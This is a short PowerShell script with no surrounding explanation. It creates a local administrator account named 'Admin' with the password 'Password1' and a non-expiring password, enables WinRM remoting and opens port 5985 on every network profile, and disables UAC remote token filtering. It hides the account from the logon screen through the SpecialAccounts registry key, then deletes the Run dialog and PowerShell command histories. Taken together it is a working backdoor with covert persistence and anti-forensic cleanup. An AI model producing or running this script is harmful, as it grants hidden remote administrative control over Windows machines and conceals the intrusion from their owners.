# Create a new local user account
$Username = "Admin"
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires

# Add the newly created user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Enable Windows Remote Management (WinRM)
Enable-PSRemoting -Force

# Ensure WinRM is allowed on all network types
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -Profile Any -Enabled True

# Add a firewall rule to allow WinRM traffic if the predefined rule is missing
if (-not (Get-NetFirewallRule -DisplayName "Windows Remote Management for RD" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -Profile Any
}

# Disable UAC remote restrictions
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "$Username" -Value 0 -PropertyType DWORD -Force

# Delete run box history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force

# Delete PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Exit PowerShell session
Exit
